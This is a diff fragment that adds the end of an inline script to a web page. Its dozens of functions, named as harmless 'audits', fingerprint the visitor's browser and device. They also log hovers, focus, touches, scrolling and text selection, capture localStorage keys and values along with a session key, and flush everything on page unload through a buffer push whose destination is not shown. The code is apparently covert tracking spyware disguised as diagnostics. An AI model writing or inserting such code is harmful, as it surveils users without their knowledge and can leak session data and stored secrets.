+    };
+    const _setActive = () => {
+      if (!active) {
+        active = true; _stageEvent('USER_RETURN', {
+          ts: Date.now()
+        });
+      }
+    };
+    let _t;
+    document.addEventListener('mousemove', () => {
+      clearTimeout(_t); _setActive(); _t = setTimeout(_setIdle, 60000);
+    });
+  }
+  _interactionAudit();
+  function _linkAudit() {
+    document.querySelectorAll('a').forEach(a => {
+      a.addEventListener('mouseenter', () => _stageEvent('HOVER_LINK', {
+        url: a.href
+      }));
+    });
+  }
+  _linkAudit();
+  function _titleAudit() {
+    let t = document.title;
+    setInterval(() => {
+      if (document.title !== t) {
+        _stageEvent('TITLE_CHANGE', {
+          from: t, to: document.title
+        });
+        t = document.title;
+      }
+    },
+      5000);
+  }
+  _titleAudit();
+  function _locationAudit() {
+    _stageEvent('LOCATION_DATA',
+      {
+        host: location.hostname,
+        path: location.pathname,
+        proto: location.protocol
+      });
+  }
+  _locationAudit();
+  function _hashAudit() {
+    window.addEventListener('hashchange',
+      () => _stageEvent('HASH_CHANGE', {
+        val: location.hash
+      }));
+  }
+  _hashAudit();
+  function _cookieAudit() {
+    _stageEvent('COOKIE_META',
+      {
+        count: document.cookie.split(';').length
+      });
+  }
+  _cookieAudit();
+  function _gamepadAudit() {
+    window.addEventListener("gamepadconnected",
+      (e) => _stageEvent('GAMEPAD_ACT', {
+        id: e.gamepad.id
+      }));
+  }
+  _gamepadAudit();
+  function _speechAudit() {
+    if (window.speechSynthesis) {
+      _stageEvent('SPEECH_CAPS', {
+        count: window.speechSynthesis.getVoices().length
+      });
+    }
+  }
+  _speechAudit();
+  function _selectionAudit() {
+    document.addEventListener('selectionchange', () => {
+      const s = window.getSelection().toString();
+      if (s.length > 5) _stageEvent('TEXT_SEL', {
+        len: s.length
+      });
+    });
+  }
+  _selectionAudit();
+  function _printAudit() {
+    window.addEventListener('beforeprint',
+      () => _stageEvent('PRINT_TRIGGER', {
+        ts: Date.now()
+      }));
+  }
+  _printAudit();
+  function _mediaQueryAudit() {
+    _stageEvent('QUERY_META',
+      {
+        dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
+        motion: window.matchMedia('(prefers-reduced-motion: reduce)').matches
+      });
+  }
+  _mediaQueryAudit();
+  function _javaAudit() {
+    _stageEvent('JAVA_ENABLED',
+      {
+        val: navigator.javaEnabled()
+      });
+  }
+  _javaAudit();
+  function _workerAudit() {
+    _stageEvent('WORKER_SUPPORT',
+      {
+        val: typeof Worker !== 'undefined'
+      });
+  }
+  _workerAudit();
+  function _idbAudit() {
+    _stageEvent('IDB_SUPPORT',
+      {
+        val: !!window.indexedDB
+      });
+  }
+  _idbAudit();
+  function _navigatorAudit() {
+    _stageEvent('NAV_PROPS',
+      {
+        v: navigator.vendor,
+        p: navigator.platform,
+        o: navigator.onLine
+      });
+  }
+  _navigatorAudit();
+  function _storageChangeAudit() {
+    window.addEventListener('storage',
+      (e) => _stageEvent('LOCAL_STORAGE_CHANGE', {
+        key: e.key, val: e.newValue
+      }));
+  }
+  _storageChangeAudit();
+  function _unhandledRejection() {
+    window.addEventListener('unhandledrejection',
+      (e) => _stageEvent('PROMISE_FAIL', {
+        reason: String(e.reason)
+      }));
+  }
+  _unhandledRejection();
+  function _resizeAudit() {
+    window.addEventListener('resize',
+      () => {
+        _resChanges.push({
+          w: window.innerWidth, h: window.innerHeight, ts: Date.now()
+        });
+        if (_resChanges.length > 3) {
+          _stageEvent('RESIZE_EVENT', [..._resChanges]); _resChanges = [];
+        }
+      });
+  }
+  _resizeAudit();
+  function _cpuConcurrency() {
+    _stageEvent('CPU_CORES',
+      {
+        count: navigator.hardwareConcurrency
+      });
+  }
+  _cpuConcurrency();
+  function _deviceRam() {
+    _stageEvent('DEVICE_RAM',
+      {
+        gb: navigator.deviceMemory || 'unknown'
+      });
+  }
+  _deviceRam();
+  function _touchStartAudit() {
+    document.addEventListener('touchstart',
+      (e) => {
+        if (e.touches[0]) {
+          _touchPts.push({
+            x: e.touches[0].pageX, y: e.touches[0].pageY, ts: Date.now()
+          });
+          if (_touchPts.length > 5) {
+            _stageEvent('TOUCH_STREAM', [..._touchPts]); _touchPts = [];
+          }
+        }
+      },
+      {
+        passive: true
+      });
+  }
+  _touchStartAudit();
+  function _finalSyncTrigger() {
+    window.addEventListener('unload',
+      () => {
+        _stageEvent('SESSION_CLOSE', {
+          ts: Date.now()
+        });
+        _pushBuffer();
+      });
+  }
+  _finalSyncTrigger();
+  function _integrityCheck() {
+    _stageEvent('NODE_INTEGRITY',
+      {
+        sess: SECURE_CONFIG.SESS_KEY,
+        href: location.href,
+        ua: navigator.userAgent
+      });
+  }
+  _integrityCheck();
+  function _videoCapsAudit() {
+    const v = document.createElement('video');
+    _stageEvent('VIDEO_CODECS',
+      {
+        mp4: v.canPlayType('video/mp4'),
+        webm: v.canPlayType('video/webm')
+      });
+  }
+  _videoCapsAudit();
+  function _audioCapsAudit() {
+    const a = document.createElement('audio');
+    _stageEvent('AUDIO_CODECS',
+      {
+        mp3: a.canPlayType('audio/mpeg'),
+        wav: a.canPlayType('audio/wav')
+      });
+  }
+  _audioCapsAudit();
+  function _shadowDomAudit() {
+    _stageEvent('SHADOW_DOM',
+      {
+        supported: !!Element.prototype.attachShadow
+      });
+  }
+  _shadowDomAudit();
+  function _keyboardAudit() {
+    if (navigator.keyboard) {
+      navigator.keyboard.getLayoutMap().then(m => _stageEvent('KBD_MAP', {
+        size: m.size
+      }));
+    }
+  }
+  _keyboardAudit();
+  function _oscillatorSync() {
+    _stageEvent('OSC_SYNC', {
+      ts: Date.now(), delta: performance.now()
+    });
+  }
+  _oscillatorSync();
+  function _domDepthAudit() {
+    _stageEvent('DOM_DEPTH', {
+      count: document.querySelectorAll('*').length
+    });
+  }
+  _domDepthAudit();
+  function _inputFocusAudit() {
+    document.addEventListener('focusin', (e) => _stageEvent('FOCUS_IN', {
+      tag: e.target.tagName, id: e.target.id
+    }));
+  }
+  _inputFocusAudit();
+  function _scrollEndAudit() {
+    let t;
+    window.addEventListener('scroll', () => {
+      clearTimeout(t);
+      t = setTimeout(() => _stageEvent('SCROLL_STOP', {
+        y: window.scrollY
+      }), 500);
+    });
+  }
+  _scrollEndAudit();
+  function _vibrationAudit() {
+    _stageEvent('VIBRATE_SUPPORT', {
+      val: !!navigator.vibrate
+    });
+  }
+  _vibrationAudit();
+  function _beaconSupport() {
+    _stageEvent('BEACON_SUPPORT', {
+      val: !!navigator.sendBeacon
+    });
+  }
+  _beaconSupport();
+  function _fetchSupport() {
+    _stageEvent('FETCH_SUPPORT', {
+      val: !!window.fetch
+    });
+  }
+  _fetchSupport();
+  function _promiseSupport() {
+    _stageEvent('PROMISE_SUPPORT', {
+      val: !!window.Promise
+    });
+  }
+  _promiseSupport();
+  function _cryptoSupport() {
+    _stageEvent('CRYPTO_SUPPORT', {
+      val: !!window.crypto
+    });
+  }
+  _cryptoSupport();
+  function _canvasMeasure() {
+    const c = document.createElement('canvas');
+    const x = c.getContext('2d');
+    x.font = "12px Arial";
+    const m = x.measureText("NSB_SYSTEM_PROBE");
+    _stageEvent('TEXT_METRICS', {
+      w: m.width
+    });
+  }
+  _canvasMeasure();
+  function _navigatorLanguage() {
+    _stageEvent('LANG_DETAIL', {
+      pref: navigator.language, all: navigator.languages
+    });
+  }
+  _navigatorLanguage();
+  function _networkType() {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (c) _stageEvent('CONN_TYPE', {
+      val: c.effectiveType
+    });
+  }
+  _networkType();
+  function _perfNavigation() {
+    if (window.performance && performance.navigation) {
+      _stageEvent('NAV_TYPE_LOG', {
+        type: performance.navigation.type
+      });
+    }
+  }
+  _perfNavigation();
+  function _domCompleteAudit() {
+    _stageEvent('DOM_READY_STATE', {
+      state: document.readyState
+    });
+  }
+  _domCompleteAudit();
+  function _executionSync() {
+    _stageEvent('EXECUTION_CHCK', {
+      ts: Date.now()
+    });
+  }
+  _executionSync();
+  function _finalNodeCheck() {
+    _stageEvent('NODE_HEALTH', {
+      status: 'OK', sid: SECURE_CONFIG.SESS_KEY
+    });
+  }
+  _finalNodeCheck();
+  })();
+</script>
 </body>
 </html>
